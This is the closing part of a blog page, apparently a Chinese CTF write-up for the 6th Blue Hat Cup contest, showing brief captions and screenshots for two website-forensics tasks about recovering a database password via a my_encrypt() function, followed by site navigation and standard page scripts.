+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204453376.png" alt="image-20220709204453376"></p>
+<p>打开看到连接密码</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204501928.png" alt="image-20220709204501928"></p>
+<h3 id="9-网站取证-2"><a href="#9-网站取证-2" class="headerlink" title="9. 网站取证_2"></a>9. 网站取证_2</h3><p>database.php中可以找到password调用了<code>my_encrypt()</code>函数</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204520285.png" alt="image-20220709204520285"></p>
+<p>跟进<code>my_encrypt()</code>函数</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204530241.png" alt="image-20220709204530241"></p>
+<p>本地跑一下得到密码</p>
+<p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204539502.png" alt="image-20220709204539502"></p>
+<h3 id="10-网站取证-3"><a href="#10-网站取证-3" class="headerlink" title="10. 网站取证_3"></a>10. 网站取证_3</h3><p><img src="/./%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220709204858323.png" alt="image-20220709204858323"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-domainhacker"><span class="toc-number">1.1.</span> <span class="toc-text">1. domainhacker</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81"><span class="toc-number">2.</span> <span class="toc-text">电子取证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%811"><span class="toc-number">2.1.</span> <span class="toc-text">1. 手机取证1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%812"><span class="toc-number">2.2.</span> <span class="toc-text">2. 手机取证2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%811"><span class="toc-number">2.3.</span> <span class="toc-text">3. 计算机取证1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%812"><span class="toc-number">2.4.</span> <span class="toc-text">4. 计算机取证2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="toc-number">2.5.</span> <span class="toc-text">5. 程序分析_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2"><span class="toc-number">2.6.</span> <span class="toc-text">6. 程序分析_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-3"><span class="toc-number">2.7.</span> <span class="toc-text">7. 程序分析_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-1"><span class="toc-number">2.8.</span> <span class="toc-text">8. 网站取证_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2"><span class="toc-number">2.9.</span> <span class="toc-text">9. 网站取证_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-3"><span class="toc-number">2.10.</span> <span class="toc-text">10. 网站取证_3</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&text=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&is_video=false&description=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup&body=Check out this article: http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&name=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/&t=第六届蓝帽杯全国大学生网络安全技能大赛初赛Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022
+        ACT
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+		
+              <span id="busuanzi_container_site_pv">
+                  Total:<font color="#2bbc8a"><span id="busuanzi_value_site_pv"></span></font>
+              </span>
+              <!--
+			  <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      <span id="busuanzi_value_site_uv"></span>
+              </span>
+			  -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
